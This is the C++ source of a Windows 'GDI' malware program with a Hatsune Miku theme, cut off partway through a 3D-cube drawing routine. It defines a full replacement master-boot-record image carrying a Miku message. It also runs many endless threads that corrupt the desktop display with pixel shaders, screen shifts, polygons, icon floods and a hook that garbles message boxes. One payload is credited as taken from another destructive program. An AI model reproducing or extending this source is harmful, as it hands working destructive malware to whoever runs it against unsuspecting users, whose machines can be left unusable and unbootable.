#include <iostream>
#include <memory>
#include <stdio.h>
#include <tchar.h>
#include <time.h>
#include <windows.h>
#include <windef.h>
#include <fstream>
#include <cstdlib>
#include <ctime>
#include <cmath>
#include <math.h>
#include <string>
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#define M_PI 3.14159265358979323846264338327950288
//#include "123.h"
using namespace std;
#define mbrsize 513
#define boot "\x8C\xC8\x8E\xD8\x8E\xC0\xBE\x00\x00\xE8\x02\x00\xEB\xFE\xB9\xF4\x01\x51\xB9\xFF\xFF\xE2\xFE\x59\xE2\xF7\xB8\x3B\x7C\x89\xC5\xB8\x01\x13\xBB\x0B\x00\xB2\x00\x89\xF1\xE9\x00\x00\xCD\x10\x81\xC6\x01\x00\x81\xFE\x3D\x00\x74\x02\xEB\xD4\xC3\x49\x66\x20\x4D\x69\x6B\x75\x20\x73\x61\x79\x73\x20\x74\x68\x61\x74\x20\x73\x68\x65\x20\x6C\x6F\x76\x65\x73\x20\x79\x6F\x75\x20\x73\x6F\x20\x6D\x75\x63\x68\x2C\x20\x77\x69\x6C\x6C\x20\x79\x6F\x75\x20\x61\x63\x63\x65\x70\x74\x20\x69\x74\x3F\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55\xAA"

void InitDPI() {
	HMODULE hModule = LoadLibraryA("user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModule);
}

int refreshscr() {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	InvalidateRect(0, 0, 0);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	return 207944154;
}

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

typedef union ColorTemp {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} *ColorTemps;
COLORREF BlendPixel(COLORREF bg, COLORREF fg, BYTE alpha) {
	BYTE r = (GetRValue(fg) * alpha + GetRValue(bg) * (255 - alpha)) / 255;
	BYTE g = (GetGValue(fg) * alpha + GetGValue(bg) * (255 - alpha)) / 255;
	BYTE b = (GetBValue(fg) * alpha + GetBValue(bg) * (255 - alpha)) / 255;
	return RGB(r, g, b);
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}

struct Point3D {
	float x, y, z;
};

Point3D RotatePoint(Point3D point, float angleX, float angleY, float angleZ) {
	float cosX = cos(angleX), sinX = sin(angleX);
	float cosY = cos(angleY), sinY = sin(angleY);
	float cosZ = cos(angleZ), sinZ = sin(angleZ);

	float y = point.y * cosX - point.z * sinX;
	float z = point.y * sinX + point.z * cosX;
	point.y = y;
	point.z = z;

	float x = point.x * cosY + point.z * sinY;
	z = -point.x * sinY + point.z * cosY;
	point.x = x;
	point.z = z;

	x = point.x * cosZ - point.y * sinZ;
	y = point.x * sinZ + point.y * cosZ;
	point.x = x;
	point.y = y;

	return point;
}

typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}

VOID WINAPI MsgBoxCorruptionThread(HWND hwndMsgBox) {
	HDC hdc = GetDC(hwndMsgBox);
	RECT rect;
	GetWindowRect(hwndMsgBox, &rect);
	int w = rect.right - rect.left, h = rect.bottom - rect.top;
	double angle = 0; BLENDFUNCTION blur = { AC_SRC_OVER, 0, 5, 0 };
	for (;;) {
		int w = rect.right - rect.left, h = rect.bottom - rect.top;
		HDC hdc = GetDC(hwndMsgBox), hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int kun = 0; kun < 5; kun++) {
			HBRUSH hBrush = CreateSolidBrush(RGB(57, 197, 187));
			HPEN pen = CreatePen(PS_NULL, NULL, NULL);
			SelectObject(hcdc, hBrush);
			SelectObject(hcdc, pen);
			Rectangle(hcdc, 0, 0, w, h);
			DeleteObject(hBrush);
			DeleteObject(pen);
			GdiAlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
			Sleep(250);
		}
		Sleep(250);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
	}
}

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_ACTIVATE) {
		HWND hwndMsgBox = (HWND)wParam;
		ShowWindow(hwndMsgBox, 5);
		HANDLE handle = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)MsgBoxCorruptionThread, hwndMsgBox, 0, NULL);
		return 0;
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}

bool control_spiral = true;
DWORD WINAPI spiral(LPVOID lpParam) {
	int qi = 0, j = 0, k = 1;
	control_spiral = true;
	while (control_spiral) {
		j += k;
		int width = GetSystemMetrics(0), height = GetSystemMetrics(1);
		LPVOID MyMemoryAddress = VirtualAlloc(0, (width * height + width) * sizeof(ColorTemp), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		ColorTemp* data = (ColorTemp*)MyMemoryAddress;
		HDC hdc = GetWindowDC(0), MemoryDC = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateBitmap(width, height, 1, 32, data);
		SelectObject(MemoryDC, hBitmap);
		BitBlt(MemoryDC, 0, 0, width, height, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hBitmap, width * height * 4, data);
		for (int i = 0; i < width * height; i++) {
			if (!control_spiral) break;
			int x = i % width - width / 2, y = i / width - height / 2;
			float angle = atan2((float)y, x) * 180 / 3.14159f;
			float radius = sqrt((float)x * x + y * y);
			int color_val = (int)(angle * 2 + radius + qi) % 768;
			ColorTemp vortex;
			if (color_val < 256) {
				vortex.r = 255 - color_val;
				vortex.g = 255 - color_val;
				vortex.b = 255 - color_val;
			}
			else if (color_val < 512) {
				vortex.r = 0;
				vortex.g = 0;
				vortex.b = 0;
			}
			else {
				vortex.r = color_val - 512;
				vortex.g = color_val - 512;
				vortex.b = color_val - 512;
			}
			BYTE alpha = (-32) + (int)(31 * sin(radius / 25.0f));
			COLORREF result = BlendPixel(
				RGB(data[i].r, data[i].g, data[i].b),
				RGB(vortex.r, vortex.g, vortex.b),
				alpha
			);
			data[i].r = GetRValue(result);
			data[i].g = GetGValue(result);
			data[i].b = GetBValue(result);
		}
		SetBitmapBits(hBitmap, width * height * 4, data);
		if (control_spiral) {
			BitBlt(hdc, 0, 0, width, height, MemoryDC, 0, 0, SRCCOPY);
		}
		ReleaseDC(0, hdc);
		ReleaseDC(0, MemoryDC);
		DeleteObject(hBitmap);
		DeleteDC(MemoryDC);
		DeleteDC(hdc);
		VirtualFree(MyMemoryAddress, 0, MEM_RELEASE);
		Sleep(32);
		qi += 24;
	}
	return 0;
}

DWORD WINAPI thirteen(LPVOID lpParam) {
	HDC hdc;
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	float ri = 2.0893, ro = 3.8946, ax = 0.5, ay = 2.0286, bx = 1.8099, by = 3.4485, cx = 1.3855, cy = 1.5639, dx = 3.2052, dy = 2.2124, ex = 1.9535, ey = 0.7409, fx = 3.8662, fy = 0.4694, gx = 2.0741, gy = 0.2518, hx = 3.6415, hy = 1.381, ix = 1.7195, iy = 1.1869, jx = 2.5826, jy = 2.9152, kx = 0.9709, ky = 1.85, lx = 0.932, ly = 3.7814;
	for (;;) {
		hdc = GetWindowDC(0);
		int x = rand() % w, y = rand() % h, z = 1 + rand() % 128, m = rand() % 256, n = rand() % 256, o = rand() % 256;
		POINT point[26] = { x,y + (ro * z),x - (ax * z),y + (ay * z),x - (bx * z),y + (by * z),x - (cx * z),y + (cy * z),x - (dx * z),y + (dy * z),x - (ex * z),y + (ey * z),x - (fx * z),y + (fy * z),x - (gx * z),y - (gy * z),x - (hx * z),y - (hy * z),x - (ix * z),y - (iy * z),x - (jx * z),y - (jy * z),x - (kx * z),y - (ky * z),x - (lx * z),y - (ly * z),x,y - (ri * z),x + (lx * z),y - (ly * z),x + (kx * z),y - (ky * z),x + (jx * z),y - (jy * z),x + (ix * z),y - (iy * z),x + (hx * z),y - (hy * z),x + (gx * z),y - (gy * z),x + (fx * z),y + (fy * z),x + (ex * z),y + (ey * z) ,x + (dx * z),y + (dy * z),x + (cx * z),y + (cy * z),x + (bx * z),y + (by * z),x + (ax * z),y + (ay * z) };
		SelectObject(hdc, CreateSolidBrush(RGB(m, n, o)));
		Polygon(hdc, point, 26);
		DeleteObject;
		ReleaseDC(NULL, hdc);
		Sleep(8);
	}
	return 0;
}

DWORD WINAPI gradient(LPVOID lpParam) {
	HDC hdc;
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int rr[4] = { 0x3900, 0x4a00,0x2500,0x0 }, gg[4] = { 0xc500,0xff00,0x8000,0xc400 }, bb[4] = { 0xbb00,0xf200,0x7900,0xb700 }, a = rand() % 4, b = rand() % 4;
		TRIVERTEX vtx[2];
		vtx[0].x = rand() % w; vtx[0].y = rand() % h;
		vtx[1].x = rand() % w; vtx[1].y = rand() % h;
		vtx[0].Red = rr[a]; vtx[0].Green = gg[a]; vtx[0].Blue = bb[a]; vtx[0].Alpha = 0xff00;
		vtx[1].Red = rr[b]; vtx[1].Green = gg[b]; vtx[1].Blue = bb[b]; vtx[1].Alpha = 0xff00;
		GRADIENT_RECT rc;
		rc.UpperLeft = 0; rc.LowerRight = 1;
		DWORD mode[4] = { GRADIENT_FILL_RECT_H,GRADIENT_FILL_RECT_V,GRADIENT_FILL_TRIANGLE, GRADIENT_FILL_OP_FLAG };
		HRGN hrgn = CreateEllipticRgn(vtx[0].x, vtx[0].y, vtx[1].x, vtx[1].y);
		SelectClipRgn(hdc, hrgn);
		GradientFill(hdc, vtx, 4, &rc, 1, mode[rand() % 4]);
		DeleteObject(hrgn);
		ReleaseDC(0, hdc);
		Sleep(50);
	}
	return 0;
}

DWORD WINAPI text(LPVOID lpParam) {
	int dwStartTime = time(NULL);
	int clr[4] = { 57,74,37,0 }, clg[4] = { 197,255,128,196 }, clb[4] = { 187,242,121,183 };
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), a, b = rand() % 4;
		HDC hdc = GetDC(NULL);
		HDC hcdc = CreateCompatibleDC(hdc);
		if (w > h) {
			a = rand() % (h / 10);
		}
		else {
			a = rand() % (w / 10);
		}
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		SetBkMode(hcdc, 1);
		LPCSTR text[5] = { "Hatsune Miku", "Vocaloid", "Crypton", "08/31/2007", "#39C5BB" };
		int tmp = rand() % 5;
		SetTextColor(hcdc, RGB(clr[b], clg[b], clg[b]));
		HFONT font = CreateFont(a, a / 2, rand() % 3600, rand() % 3600, rand() % 901, 0, 0, 0, ANSI_CHARSET, OUT_CHARACTER_PRECIS, CLIP_CHARACTER_PRECIS, rand() % 5, (rand() % 5 << 4), "114514");
		SelectObject(hcdc, font);
		TextOutA(hcdc, rand() % w, rand() % h, text[tmp], strlen(text[tmp]));
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(font);
		DeleteObject(hdc);
		DeleteObject(hcdc);
		DeleteObject(hBitmap);
		Sleep(5);
	}
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	return 0;
}

DWORD WINAPI shader1(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			rgbScreen[i].rgb = (rgbScreen[i].rgb * 2) % (RGB(255, 255, 255));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteDC(hdcScreen);
	}
	return 0;
}

DWORD WINAPI rgb(LPVOID lpParam) {//From WinRGBDestructive.exe
	HWND v3; // rax
	HBITMAP h; // [rsp+58h] [rbp-38h]
	HDC hdcSrc; // [rsp+60h] [rbp-30h]
	HDC hdc; // [rsp+68h] [rbp-28h]
	void* lpvBits; // [rsp+70h] [rbp-20h]
	int nHeight; // [rsp+78h] [rbp-18h]
	int nWidth; // [rsp+7Ch] [rbp-14h]
	DWORD v12; // [rsp+80h] [rbp-10h]
	int j; // [rsp+84h] [rbp-Ch]
	int v14; // [rsp+88h] [rbp-8h]
	int i; // [rsp+8Ch] [rbp-4h]
	v12 = GetTickCount();
	nWidth = GetSystemMetrics(SM_CXSCREEN);
	nHeight = GetSystemMetrics(SM_CYSCREEN);
	lpvBits = VirtualAlloc(0, 4 * nWidth * (nHeight + 1), 0x3000u, 4u);
	for (;;)
	{
		hdc = GetDC(0);
		hdcSrc = CreateCompatibleDC(hdc);
		h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
		SelectObject(hdcSrc, h);
		BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
		GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
		v14 = 0;
		if (GetTickCount() - v12 > 0xA)
			rand();
		for (j = 0; nHeight * nWidth > j; ++j)
		{
			if (!(j % nHeight) && !(rand() % 110))
				v14 = rand() % 24;
			*((BYTE*)lpvBits + 4 * j + v14) -= 5;
		}
		SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
		BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0xCC0020u);
		DeleteObject(h);
		DeleteObject(hdcSrc);
		DeleteObject(hdc);
	}
	return 0;
}

DWORD WINAPI movescr(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetWindowDC(0);
	int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
	int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
	for (;;) {
		/*POINT point[3];
		point[0].x = (rand() % 3 - 1) * (rand() % 3) * (rand() % 3 + 1),point[0].y = (rand() % 3 - 1) * (rand() % 3) * (rand() % 3 + 1);
		point[1].x = w+((rand() % 3 - 1) * (rand() % 3) * (rand() % 3 + 1)), point[1].y = (rand() % 3 - 1) * (rand() % 3) * (rand() % 3 + 1);
		point[2].x = ((rand() % 3 - 1) * (rand() % 3) * (rand() % 3 + 1)), point[2].y = h+(rand() % 3 - 1) * (rand() % 3) * (rand() % 3 + 1);*/
		DWORD ROP[3] = { SRCCOPY,NOTSRCCOPY ,PATINVERT };
		/*BOOL Blt[3] = {BitBlt(hdc, (rand() % 3 - 1) * (rand() % 3) * (rand() % 3 + 1), (rand() % 3 - 1) * (rand() % 3) * (rand() % 3 + 1),w,h,hdc,0,0,ROP[rand() % 3]),
		PlgBlt(hdc,point,hdc,0,0,w,h,0,(rand() % 3 - 1) * (rand() % 3) * (rand() % 3 + 1),(rand() % 3 - 1) * (rand() % 3) * (rand() % 3 + 1)),
		PatBlt(hdc,(rand() % 3 - 1) * (rand() % 3) * (rand() % 3 + 1), (rand() % 3 - 1) * (rand() % 3) * (rand() % 3 + 1),w,h,ROP[rand()%3])
		};*/
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		BitBlt(hdc, (rand() % 3 - 1) * (rand() % 3) * (rand() % 3 + 1), (rand() % 3 - 1) * (rand() % 3) * (rand() % 3 + 1), w, h, hdc, 0, 0, ROP[rand() % 3]);
		DeleteObject;
		Sleep(10);
	}
	return 0;
}

DWORD WINAPI shader2(LPVOID lpParam) {
	int time = GetTickCount();
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		BYTE byte = 0;
		if ((GetTickCount() - time) > 60000)
			byte = rand() % 0xff;
		for (int i = 0; w * h > i; i++) {
			INT x = i % w, y = i / w;
			if (!(i % h) && !(rand() % 110))
				v = rand() % 24;
			*((BYTE*)data + 4 * i + v) += x & y;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

DWORD WINAPI drawtancotfunctionicon(LPVOID lpParam) {
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetWindowDC(NULL);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
		int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
		int a = (h / 2) - rand() % h, b = (20000 / h) + rand() % (2000 / h), c = rand() % w, d = rand() % h, e = 1 + rand() % 32, f = 10 + rand() % 55;
		SelectObject(hdc, CreatePen(PS_NULL, 0, NULL));
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
		SelectObject(hdc, brush);
		if (a != 0, b != 0) {
			for (int x = 0; x <= w; x += 1 * wdpi / 96) {
				Ellipse(hdc, x, a * tan((b / static_cast<double>(80)) * (x * M_PI / 180) + (c / 8)) + d, x + f, a * tan((b / static_cast<double>(80)) * (x * M_PI / 180) + (c / 8)) + d + f);
				LineTo(hdc, x + (f / 2), a * tan((b / static_cast<double>(80)) * (x * M_PI / 180) + (c / 8)) + d + (f / 2));
			}
			for (int y = 0; y <= h; y += 1 * wdpi / 96) {
				Ellipse(hdc, (atan((float)(y - d) / a) - (c / 8)) / (b / 80) * 40 / M_PI, y, (atan((float)(y - d) / a) - (c / 8)) / (b / 80) * 40 / M_PI + f, y + f);
			}
		}
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	return 0;
}

DWORD WINAPI drawinverseproportionalfunctionicon(LPVOID lpParam) {
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HWND hwnd = GetDesktopWindow();
		HDC hdc = GetWindowDC(hwnd);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
		int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
		int a = 124 - rand() % 250, b = rand() % h, c = rand() % h, d = 1 + rand() % 15, e = 1 + rand() % 32;
		if (a != 0) {
			for (int x = 0; x <= w; x += e * wdpi / 96) {
				if (x != b) {
					DrawIcon(hdc, x, -(a * 5000 / (x - b)) + c, LoadCursor(GetModuleHandleA(0), MAKEINTRESOURCE(d)));
				}
			}
			for (int y = 0; y <= h; y += e * wdpi / 96) {
				if (y != c) {
					DrawIcon(hdc, -(a * 5000 / (y - c)) + b, y, LoadCursor(GetModuleHandleA(0), MAKEINTRESOURCE(d)));
				}
			}
		}
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	return 0;
}

DWORD WINAPI manyicon(LPVOID lpParam) {
	HINSTANCE HSHELL32 = LoadLibrary(_T("Shell32.dll"));
	HINSTANCE HIMAGERES = LoadLibrary(_T("Imageres.dll"));
	HINSTANCE HMORICONS = LoadLibrary(_T("Moricons.dll"));
	HINSTANCE HPIFMGR = LoadLibrary(_T("Pifmgr.dll"));
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetWindowDC(NULL);
		int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
		int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
		HICON load[9] = { LoadIcon(HSHELL32, MAKEINTRESOURCE(1 + rand() % 336)),LoadIcon(HIMAGERES,MAKEINTRESOURCE(1 + (rand() % 365))),LoadIcon(NULL,MAKEINTRESOURCE(32512 + (rand() % 7))),LoadIcon(HMORICONS,MAKEINTRESOURCE(1 + (rand() % 38))),LoadIcon(HPIFMGR,MAKEINTRESOURCE(1 + (rand() % 113))),LoadCursor(NULL,MAKEINTRESOURCE(101 + rand() % 18)) ,LoadCursor(NULL,MAKEINTRESOURCE(32640 + rand() % 30)) ,LoadCursor(NULL,MAKEINTRESOURCE(32512 * rand() % 5)), LoadCursor(NULL,MAKEINTRESOURCE(32631)) };
		DrawIconEx(hdc, rand() % w, rand() % h, load[rand() % 9], 96 * wdpi / 96, 96 * hdpi / 96, NULL, NULL, DI_NORMAL);
		DrawIconEx(hdc, rand() % w, rand() % h, load[rand() % 9], 96 * wdpi / 96, 96 * hdpi / 96, NULL, NULL, DI_NORMAL);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	return 0;
}

void Draw3DCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ) {
	Point3D vertices[8] = {
		{-size, -size, -size},
		{size, -size, -size},
		{size, size, -size},
		{-size, size, -size},
		{-size, -size, size},
		{size, -size, size},
		{size, size, size},
		{-size, size, size},
	};

	POINT screenPoints[8];
	for (int i = 0; i < 8; ++i) {
		Point3D rotated = RotatePoint(vertices[i], angleX, angleY, angleZ);
		int screenX = static_cast<int>(center.x + rotated.x);
		int screenY = static_cast<int>(center.y + rotated.y);
		screenPoints[i].x = screenX;
		screenPoints[i].y = screenY;
	}
	/*POINT polyline1[4] = {screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3]};
	POINT polyline2[4] = { screenPoints[4], screenPoints[5], screenPoints[6], screenPoints[7] };
	POINT polyline3[4] = { screenPoints[0], screenPoints[1], screenPoints[5], screenPoints[4] };
	POINT polyline4[4] = { screenPoints[3], screenPoints[2], screenPoints[6], screenPoints[7] };
	POINT polyline5[4] = { screenPoints[1], screenPoints[2], screenPoints[6], screenPoints[5] };
	POINT polyline6[4] = { screenPoints[0], screenPoints[3], screenPoints[7], screenPoints[4] };
	//Polyline(hdc, polyline1, 5);
	//Polyline(hdc, polyline2, 5);
	SelectObject(hdc, CreatePen(PS_NULL, NULL, NULL));
	SelectObject(hdc, CreateSolidBrush(RGB(255, 0, 0)));
	Polygon(hdc, polyline1, 4);
	SelectObject(hdc, CreateSolidBrush(RGB(0, 255, 255)));
